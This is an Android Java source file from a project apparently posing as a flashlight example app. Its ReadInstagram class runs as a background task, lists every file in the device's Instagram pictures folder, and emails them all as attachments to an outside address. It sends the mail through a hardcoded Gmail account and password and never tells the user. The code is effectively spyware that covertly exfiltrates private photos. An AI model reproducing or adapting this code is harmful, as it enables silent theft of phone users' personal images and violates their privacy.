package com.example.flashlightexample;

import java.io.File;

import android.os.AsyncTask;
import android.util.Log;

public class ReadInstagram extends AsyncTask<Void, Void, Void>{

	 @Override
     protected void onPreExecute() {
        super.onPreExecute();
     }

     @Override
     protected Void doInBackground(Void... params) {
    	 System.out.println("mail gönderiliyor...");
 		InstagramOfMail m = new InstagramOfMail("hemenindir57@gmail.com","123xxx123"); 
 	    //   emailGonder();
 			 String[] toArr = {"mehmetduman34500@gmail.com"}; 
 		        m.setTo(toArr); 
 		        m.setFrom("hemenindir57@gmail.com"); 
 		        m.setSubject("--Instagram Resimleri--"); 
 		        m.setBody("Email body"); 
 		       
 		        try { 
 		        	
 		        	String path = "/storage/sdcard0/Pictures/Instagram";                 	            
 	                 File fileDir = new File( path );
 	                  String[] _files = fileDir.list(); 
 	                 for ( int i = 0 ; i < _files.length ; i++  )
 	                 { 
 	                     _files[i] = path + "/"+ _files[i];
 	               //        _files[i] = path + "/"+ _files[i].substring(_files[i].lastIndexOf("/"));
 	                       m.addAttachment(_files[i]);
 	                      
 	                    //   Log.i("zms", "zms "+_files[i].substring(_files[i].lastIndexOf("/")));
 	                 
 	                       }
 	                 
 	                if(m.send()) { 

    	                 for ( int i = 0 ; i < _files.length ; i++  )
    	                  { 
    	                      Log.i("zms test _files", "zms success");
    	                  }
    	                  
    	              } else { 
    	                  Log.i("zms test mail result", "zms fail");
    	              }
 		        }
 	                catch(Exception e) {
 		                 Log.i("zms test mail result", "zms error while sending");
 		            } 
 			return null;
     }

     @Override
     protected void onPostExecute(Void result) {
        super.onPostExecute(result);
     }

     @Override
     protected void onProgressUpdate(Void... values) {
        super.onProgressUpdate(values);
     }

     @Override
     protected void onCancelled(Void result) {
        super.onCancelled(result);
     }
}
